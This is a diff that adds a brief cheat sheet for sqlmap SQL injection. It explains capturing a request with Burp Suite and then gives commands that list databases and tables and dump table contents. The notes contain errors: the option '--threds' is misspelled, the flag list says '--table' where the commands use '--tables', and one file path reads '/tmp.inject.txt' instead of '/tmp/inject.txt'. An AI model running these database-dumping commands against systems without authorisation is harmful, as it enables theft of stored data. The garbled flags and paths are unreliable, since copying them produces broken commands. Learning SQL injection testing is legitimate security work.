@@ -1,0 +1,17 @@
+we create /tmp/inject.txt with burp suit proxy
+
+
+increase --threds for more speed
+
+-r -> source file (burpsuit)
+--dbs -> show all databases
+-D -> database name
+--table -> show all tables
+-T -> table name
+--dump -> show what is in table
+
+sqlmap -r /tmp.inject.txt --dbs
+
+sqlmap -r /tmp/inject.txt -D database-name --tables
+
+sqlmap -r /tmp/inject.txt -D database-name -T table-name --dump
